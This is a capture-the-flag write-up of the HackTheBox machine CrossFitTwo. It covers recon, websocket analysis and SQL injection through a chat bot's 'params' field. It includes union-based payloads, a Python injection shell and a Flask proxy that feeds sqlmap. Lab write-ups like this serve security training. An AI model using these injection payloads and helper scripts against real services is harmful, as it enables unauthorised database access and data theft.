---
title: HTB: CrossFitTwo
url: https://0xdf.gitlab.io/2021/08/14/htb-crossfittwo.html
date: 2021-08-14T13:45:00+00:00
difficulty: Insane [50]
tags: hackthebox, ctf, htb-crossfittwo, nmap, openbsd, feroxbuster, burp, websocket, sqli, injection, vhosts, unbound, python, python-cmd, flask, sqlmap, relayd, api, wfuzz, cors, phishing, socket-io, javascript, nodejs, node-modules, yubikey, changelist, ykgenerate, htb-crossfit
---

![CrossFitTwo](https://0xdfimages.gitlab.io/img/crossfittwo-cover.png)

Much like CrossFit, CrossFitTwo was just a monster of a box. The centerpiece is a crazy cross-site scripting attack through a password reset interface using DNS to redirect the admin to a site I control to then have them register an account for me. I’ll then hijack some socket.io messages to get access to chats where I’ll capture a password to get a shell. On the box, I’ll abuse NodeJS’s module load order, then extract the root ssh key from a changelist backup and the yubikey seed needed to get SSH as root.

## Box Info

| Name | [CrossFitTwo](https://hackthebox.com/machines/crossfittwo)  [CrossFitTwo](https://hackthebox.com/machines/crossfittwo) [Play on HackTheBox](https://hackthebox.com/machines/crossfittwo) |
| --- | --- |
| Release Date | [20 Mar 2021](https://twitter.com/hackthebox_eu/status/1372571033623003144) |
| Retire Date | 14 Aug 2021 |
| OS | OpenBSD OpenBSD |
| Base Points | Insane [50] |
| Rated Difficulty | Rated difficulty for CrossFitTwo |
| Radar Graph | Radar chart for CrossFitTwo |
| First Blood User | 1 day20:18:36[InfoSecJack InfoSecJack](https://app.hackthebox.com/users/52045) |
| First Blood Root | 1 day23:53:47[xct xct](https://app.hackthebox.com/users/13569) |
| Creators | [MinatoTW MinatoTW](https://app.hackthebox.com/users/8308)  [polarbearer polarbearer](https://app.hackthebox.com/users/159204) |

## Recon

### nmap

`nmap` found three open TCP ports, SSH (22), HTTP (80), and ub-dns-control (8953):

```

oxdf@parrot$ sudo nmap -p- --min-rate 10000 -oA scans/nmap-alltcp 10.10.10.232
Starting Nmap 7.91 ( https://nmap.org ) at 2021-06-12 14:30 EDT
Nmap scan report for 10.10.10.232
Host is up (0.093s latency).
Not shown: 50822 filtered ports, 14710 closed ports
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
8953/tcp open  ub-dns-control

Nmap done: 1 IP address (1 host up) scanned in 220.12 seconds

oxdf@parrot$ sudo nmap -p 22,80,8953 -sCV -oA scans/nmap-tcpscripts 10.10.10.232
Starting Nmap 7.91 ( https://nmap.org ) at 2021-06-12 14:36 EDT
Nmap scan report for 10.10.10.232
Host is up (0.020s latency).

PORT     STATE SERVICE             VERSION
22/tcp   open  ssh                 OpenSSH 8.4 (protocol 2.0)
| ssh-hostkey: 
|   3072 35:0a:81:06:de:be:8c:d8:d7:27:66:db:96:94:fd:52 (RSA)
|   256 94:60:55:35:9a:1a:a8:45:a1:ae:19:cd:61:05:ec:3f (ECDSA)
|_  256 a2:c8:6b:6e:11:b6:70:69:db:d2:60:2e:2f:d1:2f:ab (ED25519)
80/tcp   open  http                (PHP 7.4.12)
| fingerprint-strings: 
|   GetRequest, HTTPOptions: 
|     HTTP/1.0 200 OK
|     Connection: close
|     Connection: close
|     Content-type: text/html; charset=UTF-8
|     Date: Sat, 12 Jun 2021 18:38:27 GMT
|     Server: OpenBSD httpd
|     X-Powered-By: PHP/7.4.12
|     <!DOCTYPE html>
|     <html lang="zxx">
|     <head>
|     <meta charset="UTF-8">
|     <meta name="description" content="Yoga StudioCrossFit">
|     <meta name="keywords" content="Yoga, unica, creative, html">
|     <meta name="viewport" content="width=device-width, initial-scale=1.0">
|     <meta http-equiv="X-UA-Compatible" content="ie=edge">
|     <title>CrossFit</title>
|     <!-- Google Font -->
|     <link href="https://fonts.googleapis.com/css?family=PT+Sans:400,700&display=swap" rel="stylesheet">
|     <link href="https://fonts.googleapis.com/css?family=Oswald:400,500,600,700&display=swap" rel="stylesheet">
|     <!-- Css Styles -->
|     <link rel="stylesheet" href="css/bootstrap.min.css" type="text/css">
|_    <link rel="styleshe
|_http-server-header: OpenBSD httpd
|_http-title: CrossFit
8953/tcp open  ssl/ub-dns-control?
| ssl-cert: Subject: commonName=unbound
| Not valid before: 2021-01-11T07:01:10
|_Not valid after:  2040-09-28T07:01:10
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port80-TCP:V=7.91%I=7%D=6/12%Time=60C4FEAF%P=x86_64-pc-linux-gnu%r(GetR
SF:equest,3000,"HTTP/1\.0\x20200\x20OK\r\nConnection:\x20close\r\nConnecti
SF:on:\x20close\r\nContent-type:\x20text/html;\x20charset=UTF-8\r\nDate:\x
...[snip]...
SF:n\.css\"\x20type=\"text/css\">\n\x20\x20\x20\x20<link\x20rel=\"styleshe
SF:");

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 28.71 seconds

```

The HTTP headers show the HTTP server is running OpenBSD `httpd`.

The TLS certificate on 8953 shows the common name of unbound, which makes sense since 8953 is the default port for control operations on the Unbound DNS resolver. It is interesting to see the DNS resolver control port, but not DNS itself, the box isn’t listening on TCP or UDP 53:

```

oxdf@parrot$ sudo nmap -sU -p 53 -oA scans/nmap-udp53 10.10.10.232
Starting Nmap 7.91 ( https://nmap.org ) at 2021-06-12 14:52 EDT
Nmap scan report for 10.10.10.232
Host is up (0.019s latency).

PORT   STATE  SERVICE
53/udp closed domain

Nmap done: 1 IP address (1 host up) scanned in 0.14 seconds

```

### Website - TCP 80

#### Site

Just like the first [Crossfit](/2021/03/20/htb-crossfit.html) box, the site is for a cross-fit gym:

[![image-20210619160557643](https://0xdfimages.gitlab.io/img/image-20210619160557643.png)](https://0xdfimages.gitlab.io/img/image-20210619160557643.png)

[*Click for full image*](https://0xdfimages.gitlab.io/img/image-20210619160557643.png)

Clicking around a bit, there’s a contact form on the Contact page, but nothing that I could get much response from. There’s a search link at the top of the site, but no obvious exploitation vectors there either.

The link to “Member Area” goes to `employees.crossfit.htb`. I’ll add the subdomain to `/etc/hosts`:

```
10.10.10.232 employees.crossfit.htb

```

Initially I added `crossfit.htb` as well, but it was already in `/etc/hosts` from the first box, and after some testing, it doesn’t seem to be used here.

#### Tech Stack

`index.php` returns the same main page, so I know this is running on PHP. The HTTP headers confirm this and give the version:

```

HTTP/1.1 200 OK
Connection: close
Content-type: text/html; charset=UTF-8
Date: Sat, 19 Jun 2021 20:28:47 GMT
Server: OpenBSD httpd
X-Powered-By: PHP/7.4.12
Content-Length: 19041

```

There’s nothing else too interesting in the HTTP headers.

#### Directory Brute Force

I’ll run `feroxbuster` against the site:

```

oxdf@parrot$ feroxbuster -u http://10.10.10.232

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.2.1
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://10.10.10.232
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
 👌  Status Codes          │ [200, 204, 301, 302, 307, 308, 401, 403, 405]
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.2.1
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🔃  Recursion Depth       │ 4
 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Cancel Menu™
──────────────────────────────────────────────────
301       20l       63w      510c http://10.10.10.232/lgn
301       20l       63w      510c http://10.10.10.232/images
301       20l       63w      510c http://10.10.10.232/img
301       20l       63w      510c http://10.10.10.232/css
301       20l       63w      510c http://10.10.10.232/js
301       20l       63w      510c http://10.10.10.232/fonts
301       20l       63w      510c http://10.10.10.232/vendor
301       20l       63w      510c http://10.10.10.232/img/blog
301       20l       63w      510c http://10.10.10.232/images/icons
301       20l       63w      510c http://10.10.10.232/img/team
301       20l       63w      510c http://10.10.10.232/vendor/animate
301       20l       63w      510c http://10.10.10.232/vendor/jquery
[####################] - 11m   389987/389987  0s      found:12      errors:2751   
[####################] - 4m     29999/29999   106/s   http://10.10.10.232
[####################] - 4m     29999/29999   103/s   http://10.10.10.232/lgn
[####################] - 5m     29999/29999   89/s    http://10.10.10.232/images
[####################] - 5m     29999/29999   86/s    http://10.10.10.232/img
[####################] - 5m     29999/29999   83/s    http://10.10.10.232/css
[####################] - 5m     29999/29999   88/s    http://10.10.10.232/js
[####################] - 6m     29999/29999   83/s    http://10.10.10.232/fonts
[####################] - 5m     29999/29999   84/s    http://10.10.10.232/vendor
[####################] - 5m     29999/29999   86/s    http://10.10.10.232/img/blog
[####################] - 5m     29999/29999   87/s    http://10.10.10.232/images/icons
[####################] - 5m     29999/29999   90/s    http://10.10.10.232/img/team
[####################] - 4m     29999/29999   100/s   http://10.10.10.232/vendor/animate
[####################] - 4m     29999/29999   113/s   http://10.10.10.232/vendor/jquery

```

`/lgn` is the only interesting bit, but it just returns a 403 forbidden, and there’s nothing else interesting that comes back from there.

#### JavaScript

If I look closely at Burp on loading the main page, there’s a request that jumps out:

![image-20210619172546720](https://0xdfimages.gitlab.io/img/image-20210619172546720.png)

`gym.crossfit.htb` is new. `/ws/` is almost certainly show for websocket.

In the source at the bottom, there’s a list of JavaScript includes:

```

    <!-- Js Plugins -->
    <script src="js/jquery-3.3.1.min.js"></script>
    <script src="js/bootstrap.min.js"></script>
    <script src="js/jquery.magnific-popup.min.js"></script>
    <script src="js/jquery.slicknav.js"></script>
    <script src="js/owl.carousel.min.js"></script>
    <script src="js/circle-progress.min.js"></script>
    <script src="js/main.js"></script>
    <script src="js/ws.min.js"></script>

```

All but the last two look like publicly available things. There’s not much interesting in `main.js` (mostly just controlling the site and it’s features), but `ws.min.js` is interesting:

```

function updateScroll(){var e=document.getElementById("chats");e.scrollTop=e.scrollHeight}var token,ws=new WebSocket("ws://gym.crossfit.htb/ws/"),pingTimeout=setTimeout(()=>{ws.close(),$(".chat-main").remove()},31e3);function check_availability(e){var s=new Object;s.message="available",s.params=String(e),s.token=token,ws.send(JSON.stringify(s))}$(".chat-content").slideUp(),$(".hide-chat-box").click(function(){$(".chat-content").slideUp()}),$(".show-chat-box").click(function(){$(".chat-content").slideDown(),updateScroll()}),$(".close-chat-box").click(function(){$(".chat-main").remove()}),ws.onopen=function(){},ws.onmessage=function(e){"ping"===e.data?(ws.send("pong"),clearTimeout(pingTimeout)):(response=JSON.parse(e.data),answer=response.message,answer.startsWith("Hello!")&&$("#ws").show(),token=response.token,$("#chat-messages").append('<li class="receive-msg float-left mb-2"><div class="receive-msg-desc float-left ml-2"><p class="msg_display bg-white m-0 pt-1 pb-1 pl-2 pr-2 rounded">'+answer+"</p></div></li>"),updateScroll())},$("#sendmsg").on("keypress",function(e){if(13===e.which){$(this).attr("disabled","disabled");var s=$("#sendmsg").val();if(""!==s){$("#chat-messages").append('<li class="send-msg float-right mb-2"><p class="msg_display pt-1 pb-1 pl-2 pr-2 m-0 rounded">'+s+"</p></li>");var t=new Object;t.message=s,t.token=token,ws.send(JSON.stringify(t)),$("#sendmsg").val(""),$(this).removeAttr("disabled"),updateScroll()}}});

```

As expected by the `min` in the name, it’s compressed with no whitespace. [JSNice](http://jsnice.org) is my JavaScript beautifier of choice, and it cleans it up a bit. After a function that handles the scrolling in a element with ID `chats`, it creates a connection to over a websocket to `gym.crossfit.htb/ws/`:

```

var token;
/** @type {!WebSocket} */
var ws = new WebSocket("ws://gym.crossfit.htb/ws/");

```

Websockets are a protocol designed to allow for two way communication over a single TCP connect at layer seven. It’s a way for pages delivered over HTTP to start and maintain connections and communication without initiating the connection each time.

Later in the JS, there’s a bit that checks a websocket message, and if it starts with “Hello!”, it displays an object with the ID `ws`:

```

    if (answer.startsWith("Hello!")) {
      $("#ws").show();
    }

```

That is a `<div>` at the bottom of the page that on load is set to `display: none`:

![image-20210620063535251](https://0xdfimages.gitlab.io/img/image-20210620063535251.png)

I’ll add `gym.crossfit.htb` to `/etc/hosts`, and refresh. Burp shows that request now returns a HTTP 101:

![image-20210620063629093](https://0xdfimages.gitlab.io/img/image-20210620063629093.png)

That’s a “Switching Protocols” response:

```

HTTP/1.1 101 Switching Protocols
Connection: Upgrade
Origin: http://10.10.10.232
Sec-WebSocket-Accept: lLDJfKjYRuzhpfFgxouyFefs5Yc=
Upgrade: websocket

```

In the WebSockets history tab in Burp Proxy, there’s not a message from the server:

![image-20210620063738648](https://0xdfimages.gitlab.io/img/image-20210620063738648.png)

That message starts with “Hello!”, which is why the `div` becomes visible. There’s also a `token`, which is referenced throughout the JS.

The new `div` is now visible floating at the bottom left of the page:

![image-20210620064142648](https://0xdfimages.gitlab.io/img/image-20210620064142648.png)

Another interesting function from `ws.js` looks for keystrokes and eventually sends what I type:

```

$("#sendmsg").on("keypress", function(event) {
  if (13 === event.which) {
    $(this).attr("disabled", "disabled");
    var s = $("#sendmsg").val();
    if ("" !== s) {
      $("#chat-messages").append('<li class="send-msg float-right mb-2"><p class="msg_display pt-1 pb-1 pl-2 pr-2 m-0 rounded">' + s + "</p></li>");
      /** @type {!Object} */
      var t = new Object;
      t.message = s;
      t.token = token;
      ws.send(JSON.stringify(t));
      $("#sendmsg").val("");
      $(this).removeAttr("disabled");
      updateScroll();
    }
  }
}

```

It does look like each time a message is received from the server, the new token is stored as `token`, and then sent back in the next message.

Sending “help” as the message suggests sends a message to the server, and a response to the client (my browser comes back):

![image-20210620065334048](https://0xdfimages.gitlab.io/img/image-20210620065334048.png)

The raw return message is:

```

{"status":"200","message":"Available commands:<br>- coaches<br>- classes<br>- memberships","token":"13e18567d6f6840121635d6e32e3f374576ceeec4ae1fa9b9d928389bea719f5"}

```

And it shows up in the chat box:

![image-20210620065900648](https://0xdfimages.gitlab.io/img/image-20210620065900648.png)

Sending “coaches” returns a list of coaches, and “classes” returns a list of classes. “memberships” returns four buttons:

![image-20210620070048198](https://0xdfimages.gitlab.io/img/image-20210620070048198.png)

Clicking them in order shows that three of them return that the plan is available and one says unavailable:

![image-20210620070131843](https://0xdfimages.gitlab.io/img/image-20210620070131843.png)

Clicking the first button sends the following JSON:

```

{"message":"available","params":"1","token":"3db377057007e82de35d1e7ec5654013da3209a8eba44f8a201f98b0996b3cd1"}

```

The others are the same but with a new token and a `params` of 2-4. The response looks like the other responses, but with an additional item, `debug`:

```

{"status":"200","message":"Good news! This membership plan is available.","token":"79fecff07bbf393d68ed9f8fdabce72bbdef1179be8db95e764f42989c782190","debug":"[id: 1, name: 1-month]"}

```

When the plan is not available, the debug just shows the `id`:

```

{"status":"200","message":"I'm sorry, this membership plan is currently unavailable.","token":"25a0a8cd2206eeab3d862fdf20e0758ccf388ff906ed7dcba711a3ed85e19cec","debug":"[id: 3]"}

```

### vhosts

Given the use of Virtual Host Routing, I’ll look for others with `wfuzz`, and find `employees`:

```

oxdf@parrot$ wfuzz -u http://10.10.10.232 -H "Host: FUZZ.crossfit.htb" -w /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt --hh 19035
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://10.10.10.232/
Total requests: 100000

=====================================================================
ID           Response   Lines    Word       Chars       Payload
=====================================================================

000006363:   200        84 L     168 W      4412 Ch     "employees"

Total time: 827.5990
Processed Requests: 100000
Filtered Requests: 99999
Requests/sec.: 120.8314

```

I’ll add `employees.crossfit.htb` to `/etc/hosts`.

`gym.crossfit.htb` doesn’t even show up - why is that? It has the same response to a normal GET request as the main website:

```

oxdf@parrot$ curl -s gym.crossfit.htb | wc
    403    1172   19041
oxdf@parrot$ curl -s 10.10.10.232 | wc
    403    1172   19041

```

This is a good reminder about vhost fuzzing - just because it comes back the same, doesn’t mean there isn’t something interesting there. It just means that that one request was the same.

### employees.crossfit.htb

#### Site

The `employees` subdomain has a login form:

![image-20210619164756128](https://0xdfimages.gitlab.io/img/image-20210619164756128.png)

Guessing at the login doesn’t leak if the username is valid:

![image-20210619164943666](https://0xdfimages.gitlab.io/img/image-20210619164943666.png)

Basic SQL injections didn’t turn up anything.

The “forgot password” link leads to `password-reset.php`, which asks for an email address:

![image-20210619165106375](https://0xdfimages.gitlab.io/img/image-20210619165106375.png)

Anything I put in there returns the same error:

![image-20210619165131985](https://0xdfimages.gitlab.io/img/image-20210619165131985.png)

#### Directory Brute Force

Nothing interesting from `feroxbuster`:

```

oxdf@parrot$ feroxbuster -u http://employees.crossfit.htb

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.2.1
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://employees.crossfit.htb
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
 👌  Status Codes          │ [200, 204, 301, 302, 307, 308, 401, 403, 405]
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.2.1
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🔃  Recursion Depth       │ 4
 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Cancel Menu™
──────────────────────────────────────────────────
301       20l       63w      510c http://employees.crossfit.htb/css
301       20l       63w      510c http://employees.crossfit.htb/vendor
301       20l       63w      510c http://employees.crossfit.htb/js
301       20l       63w      510c http://employees.crossfit.htb/vendor/jquery
301       20l       63w      510c http://employees.crossfit.htb/vendor/animate
[####################] - 4m    179994/179994  0s      found:5       errors:0      
[####################] - 1m     29999/29999   402/s   http://employees.crossfit.htb
[####################] - 2m     29999/29999   248/s   http://employees.crossfit.htb/css
[####################] - 2m     29999/29999   207/s   http://employees.crossfit.htb/vendor
[####################] - 2m     29999/29999   210/s   http://employees.crossfit.htb/js
[####################] - 2m     29999/29999   239/s   http://employees.crossfit.htb/vendor/jquery
[####################] - 2m     29999/29999   246/s   http://employees.crossfit.htb/vendor/animate

```

I tried running with `-x php`, but it seems any page that doesn’t exist actually returns a 403 with the body “Access denied.”. I’ll use `-C 403` to filter those from the results:

```

oxdf@parrot$ feroxbuster -u http://employees.crossfit.htb -x php -C 403 

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.2.1
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://employees.crossfit.htb
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
 👌  Status Codes          │ [200, 204, 301, 302, 307, 308, 401, 403, 405]
 💢  Status Code Filters   │ [403]
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.2.1
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 💲  Extensions            │ [php]
 🔃  Recursion Depth       │ 4
 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Cancel Menu™
──────────────────────────────────────────────────
200       84l      168w        0c http://employees.crossfit.htb/index.php
301       20l       63w      510c http://employees.crossfit.htb/css
301       20l       63w      510c http://employees.crossfit.htb/js
200       76l      161w        0c http://employees.crossfit.htb/password-reset.php
301       20l       63w      510c http://employees.crossfit.htb/vendor
[####################] - 2m    239992/239992  0s      found:5       errors:75838  
[####################] - 2m     59998/59998   430/s   http://employees.crossfit.htb
[####################] - 2m     59998/59998   438/s   http://employees.crossfit.htb/css
[####################] - 1m     59998/59998   592/s   http://employees.crossfit.htb/js
[####################] - 26s    59998/59998   2285/s  http://employees.crossfit.htb/vendor

```

It doesn’t find anything new.

### Unbound - TCP 8953

Reading about Unbound, 8953 is the control port, and it is connected to by the `unbound-control` application. In my Parrot VM, I’ll run `sudo apt install unbound` to install Unbound and the control utility. The help dialog for `unbound-control` is long, and there are a ton of commands. I’ll try `status`. It also shows `-s` will specify a server:

```

oxdf@parrot$ unbound-control -s 10.10.10.232 status
error: Error setting up SSL_CTX client cert
/etc/unbound/unbound_control.pem: Permission denied

```

That file is owned by root. I’ll run this with `sudo`, but new errors:

```

oxdf@parrot$ sudo unbound-control -s 10.10.10.232 status
error: SSL handshake failed
140338348316608:error:1416F086:SSL routines:tls_process_server_certificate:certificate verify failed:../ssl/statem/statem_clnt.c:1913:

```

It’s trying to authenticate the client, but the certificates don’t match. Looking through the man page for [Unbound Config](https://manpages.debian.org/unstable/unbound/unbound.conf.5.en.html), there’s an option `control-use-cert` in the `remote-control` section:

> **control-use-cert: \*<yes or no>\***
>
> For localhost control-interface you can disable the use of TLS by setting this option to
> “no”, default is “yes”. For local sockets, TLS is disabled and the value of this option is ignored.

I’ll try setting this in `/etc/unbound/unbound.conf`:

```

include-toplevel: "/etc/unbound/unbound.conf.d/*.conf"

remote-control:
  control-use-cert: no

```

Now running it returns nothing, so it’s probably not working. I’ll see if I can find the keys to authenticate. I’ll also reset my config file back to default.

## Filesystem Read Access

### Find SQLi in Websockets

#### Interacting with WS

For initial enumeration, I found two solid methods for interacting with the websockets. Burp is really nice here. I can find one of the websocket messages from the Proxy -> Websocket History tab and right click and send it to Repeater:

![image-20210620171109956](https://0xdfimages.gitlab.io/img/image-20210620171109956.png)

At this point, the websocket connection isn’t live. I’ll click Reconnect or toggle the button to the left of “History” to connect, and then the first message with “Hello!” from the server shows up:

![image-20210620171442611](https://0xdfimages.gitlab.io/img/image-20210620171442611.png)

The incoming and outgoing messages show up on the top right. I can craft messages on the left. If I update the token and send, it works:

![image-20210620171532838](https://0xdfimages.gitlab.io/img/image-20210620171532838.png)

Alternatively, I can use the Python3 `websockets` module from the command line. I’ll need to type out (or paste) the full JSON responses:

```

oxdf@parrot$ python3 -m websockets ws://gym.crossfit.htb/ws
Connected to ws://gym.crossfit.htb/ws.
< {"status":"200","message":"Hello! This is Arnold, your assistant. Type 'help' to see available commands.","token":"d151ae6924e5bb628c5379199ff982a575b701e5c6f1099a6e83e1613149f53f"}
> {"message":"help","token":"d151ae6924e5bb628c5379199ff982a575b701e5c6f1099a6e83e1613149f53f"}
< {"status":"200","message":"Available commands:<br>- coaches<br>- classes<br>- memberships","token":"3858e6449c9c4a0e8f58c88964078fc94c03a4bd1373f57bc1f96fa3ea73629e"}
> {"message":"available","params":"3", "token": "3858e6449c9c4a0e8f58c88964078fc94c03a4bd1373f57bc1f96fa3ea73629e"}
< {"status":"200","message":"I'm sorry, this membership plan is currently unavailable.","token":"904351cd5aa1e6c03dd19594dd915a1e5d1b9ec2fe393a1b8613901a03ea0ab5","debug":"[id: 3]"}

```

#### Testing For SQLi

A standard SQLi check is to send a `'` character, but that does nothing interesting here:

```

> {"message":"available","params":"3'", "token": "904351cd5aa1e6c03dd19594dd915a1e5d1b9ec2fe393a1b8613901a03ea0ab5"}
< {"status":"200","message":"I'm sorry, this membership plan is currently unavailable.","token":"ea2663615bfd00c6bb3f4638d6de15324b231a65df3d431633701a187a859c7f","debug":"[id: 3']"}

```

The `debug` output shows that it just handled the `id` as `3'`. Thinking about it, given that this query is matching on an int and not a string, it doesn’t make sense to try to close the `'` or `"`. The SQL on the server likely looks like:

```

SELECT id, name from plans where id = {input};

```

I’ll try to send a plan I know doesn’t exist (like 3) and then some logic to get a result back anyway:

```

> {"message":"available","params":"3 or 1=1 limit 1", "token": "c7b7380052ae1f879ea21abc2bccf2e6fbed9bd0591cef8a33ae4847646bb1a1"}
< {"status":"200","message":"Good news! This membership plan is available.","token":"6159bbf250c19fbee0b57c19557bcc63aa17df9420c03cfd60c26825b336cf2b","debug":"[id: 1, name: 1-month]"}

```

That worked! The `or 1=1` would make all the rows return, and then the `limit 1` just gets the top (since it’s almost certainly expecting only one). It actually works the same without the `limit`:

```

> {"message":"available","params":"3 or 1=1", "token": "6159bbf250c19fbee0b57c19557bcc63aa17df9420c03cfd60c26825b336cf2b"}
< {"status":"200","message":"Good news! This membership plan is available.","token":"276d1d23f8ff41e50b92813f3ea84dd6b0bc8751a98593ee2ef8dad4cf02d716","debug":"[id: 1, name: 1-month]"}

```

This is confirmed SQL injection.

#### Union Injection

First I’ll need to find the number of columns, and I correctedly guessed it was two:

```

> {"message":"available","params":"3 union select 1,2", "token": "276d1d23f8ff41e50b92813f3ea84dd6b0bc8751a98593ee2ef8dad4cf02d716"}
< {"status":"200","message":"Good news! This membership plan is available.","token":"f9b5fbc2a75ab1a5066af29319b5b6e57a990ffa1b010a03d7592336a26906bb","debug":"[id: 1, name: 2]"}

```

I can get things like the current user and current database:

```

> {"message":"available","params":"3 union select user(),database()", "token": "f9b5fbc2a75ab1a5066af29319b5b6e57a990ffa1b010a03d7592336a26906bb"}
< {"status":"200","message":"Good news! This membership plan is available.","token":"1f607be2cd84c55a7df548f93a8bf862c45639a81f518e3ad5cffdae091f9ebc","debug":"[id: crossfit_user@localhost, name: crossfit]"}

```

### SQLi Helpers

I’ll show two ways to exploit this SQL injection in websockets, first with a Python shell that allows me to easily send injections, and then using `sqlmap` and a custom `flask` proxy.

#### Python Loop

To exploit this, I’ll create a Python script to manually read in injections from me at the command line, and then print the result. I’ll use the `cmd` module to make a pretty terminal with up arrow for history support. The first attempt I made was:

```

#!/usr/bin/env python3

import json
import websocket
from cmd import Cmd

class Term(Cmd):
    prompt = "injection> "

    def __init__(self):
        self.ws = websocket.create_connection("ws://gym.crossfit.htb/ws/")
        data = json.loads(self.ws.recv())
        self.token = data["token"]
        super().__init__()

    def default(self, args):
        self.ws.send(
            f'{{"message":"available","params":"{params}", "token": "{self.token}"}}'
        )
        data = json.loads(self.ws.recv())
        self.token = data["token"]
        print(data["debug"])
        
    def do_exit(self, args):
        return True

term = Term()
term.cmdloop()

```

Basically I create a `Term` class which subclasses `Cmd`. I set the prompt, and use the `__init__` function to create the connection to the websocket, and get the first token. The `default` function will run on any input, with the input as `args`. It will send the input as the `params` argument in the JSON payload, including the most recent `token`, and then read the response, update the `token`, and print the `debug`.

The issue this would run into is that waiting more than a few seconds to look up the SQL for the next injection would lead to a timeout on the websocket, and an exception on the `read`. I refactored a bit to now catch that error, reconnect, and then continue:

```

#!/usr/bin/env python3

import json
import websocket
from cmd import Cmd

class Term(Cmd):
    prompt = "injection> "

    def __init__(self):
        self.connect()
        super().__init__()

    def connect(self):
        self.ws = websocket.create_connection("ws://gym.crossfit.htb/ws/")
        data = json.loads(self.ws.recv())
        self.token = data["token"]

    def send_ws(self, params):
        self.ws.send(
            f'{{"message":"available","params":"{params}", "token": "{self.token}"}}'
        )
        data = json.loads(self.ws.recv())
        self.token = data["token"]
        print(data["debug"])

    def default(self, args):
        try:
            self.send_ws(args)
        except websocket._exceptions.WebSocketConnectionClosedException:
            self.connect()
            self.send_ws(args)
            
    def do_exit(self, args):
        return True

term = Term()
term.cmdloop()

```

Running it, I can send the same kinds of payloads shown above:

```

oxdf@parrot$ python3 sqli_shell.py
injection> 1
[id: 1, name: 1-month]
injection> 3
[id: 3]
injection> 3 union select 1,2
[id: 1, name: 2]

```

I can easily list the databases as well:

```

injection> 3 union select group_concat(schema_name),2 from information_schema.schemata
[id: information_schema,crossfit,employees, name: 2]

```

I could take this further by adding commands. For example, with a little refactoring, I’ll add two commands that will list the databases and the tables within a database:

```

#!/usr/bin/env python3

import json
import websocket
from cmd import Cmd

class Term(Cmd):
    prompt = "injection> "

    def __init__(self):
        self.connect()
        super().__init__()

    def connect(self):
        self.ws = websocket.create_connection("ws://gym.crossfit.htb/ws/")
        data = json.loads(self.ws.recv())
        self.token = data["token"]

    def send_ws(self, params):
        self.ws.send(
            f'{{"message":"available","params":"{params}", "token": "{self.token}"}}'
        )
        data = json.loads(self.ws.recv())
        self.token = data["token"]
        return data["debug"]

    def send_connected(self, params):
        try:
            return self.send_ws(params)
        except websocket._exceptions.WebSocketConnectionClosedException:
            self.connect()
            return self.send_ws(params)

    def default(self, args):
        print(self.send_connected(args))

    def do_dbs(self, args):
        results = self.send_connected(
            "3 union select group_concat(schema_name),2 from information_schema.schemata"
        )
        print("\n".join(results.split(", ")[0].split()[1].split(",")))

    def do_tables(self, args):
        if len(args) == 0:
            print("[-] database name required. run dbs command to list databases.")
            return
        results = self.send_connected(
            f"3 union select group_concat(table_name), 2 from information_schema.tables where table_schema='{args}'"
        )
        print("\n".join(results.split(", ")[0].split()[1].split(",")))

    def do_exit(self, args):
        return True

term = Term()
term.cmdloop()

```

Now in the shell, shows additional commands:

```

injection> help

Documented commands (type help <topic>):
========================================
help

Undocumented commands:
======================
dbs  exit  tables

```

Running them works as expected:

```

injection> tables crossfit
membership_plans
injection> tables employees
employees
password_reset

```

It would be easy to add commands to list columns in a given table and to dump rows from the table as well.

#### sqlmap + flask

An alternative to doing the SQL injections manually would be to use the power of something like `sqlpmap` to enumerate this database. As of the time of this post, there isn’t a way to target a websocket connection in `sqlmap`. I’ll write a simple Flask webserver that will get a request with a single parameter, and use that to make the websocket connection with that parameter as the injection. This allows `sqlmap` to see a standard HTTP server, but then it does the websockets injection.

```

#!/usr/bin/env python3

import json
import signal
import websocket
from flask import *

app = Flask(__name__)

@app.route("/")
def index():
    ws = websocket.create_connection('ws://gym.crossfit.htb/ws/')
    data = ws.recv()
    token = json.loads(data)['token']
    params = request.args['params']
    ws.send(f'{{"message":"available","params":"{params}", "token": "{token}"}}')
    data = ws.recv()
    return json.loads(data)['debug']

if __name__ == "__main__":
    app.run(debug=True)

```

